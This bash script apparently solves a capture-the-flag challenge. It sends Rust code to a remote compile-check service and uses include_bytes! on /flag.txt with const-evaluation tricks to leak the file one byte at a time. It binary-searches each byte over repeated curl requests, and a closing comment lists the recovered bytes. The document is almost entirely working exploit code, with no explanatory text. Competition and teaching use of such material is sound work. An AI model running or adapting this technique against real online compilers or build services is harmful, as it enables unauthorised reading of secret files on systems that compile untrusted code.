#!/bin/bash

cat > /dev/null << EOF
const A: &'static [u8] = include_bytes!("/flag.txt");

const SIZED_CHECK: usize = (A.len() == 71) as usize - 1;
const SIZED_CHECKi: usize = (A[0] > 0) as usize - 1;

fn main() {}
EOF

check_atleast() {
RESULT="$(curl -s 'http://challenges2.france-cybersecurity-challenge.fr:6005/check' \
  -H 'Connection: keep-alive' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://challenges2.france-cybersecurity-challenge.fr:6005' \
  -H 'Referer: http://challenges2.france-cybersecurity-challenge.fr:6005/' \
  -H 'Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,fr;q=0.7' \
  --data-binary '{"content":"const A: &'"'"'static [u8] = include_bytes\u0021(\"/flag.txt\");const SIZED_CHECK: usize = (A.len() == 71) as usize - 1;const SIZED_CHECKi: usize = (A['$1'] >= '$2') as usize - 1;fn main() {}"}' \
  --compressed \
  --insecure)"

    if [ "$RESULT" == '{"result":0}' ] ; then
        echo "At least $1 $2 : TRUE"
        return 0
    fi
    if [ "$RESULT" == '{"result":1}' ] ; then
        echo "At least $1 $2 : FALSE"
        return 1
    fi
    echo >&2 "Error: unexpected result $RESULT"
    exit 42
}

ARR=()
for POS in $(seq 0 70) ; do
    MIN=0
    MAX=128
    while [ $((MIN + 1)) -lt $MAX ] ; do
        GUESS=$(( (MIN + MAX) / 2))
        if check_atleast $POS $GUESS ; then
            MIN=$GUESS
        else
            MAX=$GUESS
        fi
    done
    echo "DONE $POS: $MIN $MAX"
    ARR+=("$MIN,")
    echo " => ARR = ${ARR[@]}"
done

# Résultat : 70, 67, 83, 67, 123, 97, 51, 53, 48, 51, 54, 52, 56, 55, 52, 51, 48, 98, 50, 52, 100, 97, 51, 56, 98, 52, 51, 101, 49, 51, 54, 57, 102, 53, 54, 101, 54, 57, 97, 50, 53, 98, 100, 51, 57, 101, 53, 57, 52, 99, 100, 49, 101, 55, 102, 102, 51, 101, 57, 55, 98, 54, 50, 98, 51, 99, 54, 51, 56, 125, 10
